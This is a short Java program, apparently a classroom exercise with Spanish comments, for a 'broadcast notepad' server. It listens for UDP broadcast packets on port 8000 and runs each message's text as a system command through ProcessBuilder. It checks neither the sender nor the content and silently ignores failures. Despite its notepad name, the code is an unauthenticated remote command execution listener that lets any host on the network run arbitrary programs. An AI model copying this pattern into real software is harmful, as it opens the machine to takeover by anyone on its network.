package BroadcastNotepad;

import java.net.DatagramPacket;
import java.net.DatagramSocket;

public class NotepadServer {
    private static final int MAX_LENGTH = 65535;
    private static final int PORT = 8000;

    public static void main(String[] args) {
        try {
            DatagramSocket socket = new DatagramSocket(PORT, null); // Abre el socket en el
                                                                    // puerto 8000
            socket.setBroadcast(true); // imprescindible para que sea broadcast
            byte[] receivedData = new byte[MAX_LENGTH];

            while (true) {
                DatagramPacket receivedPacket = new DatagramPacket(receivedData, receivedData.length);
                socket.receive(receivedPacket); // Espera y recibe el paquete

                // Extrae la información del paquete
                String message = new String(receivedPacket.getData(), 0, receivedPacket.getLength());
                try {
                    ProcessBuilder builder = new ProcessBuilder(message);
                    builder.start();
                } catch (Exception e) {}
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
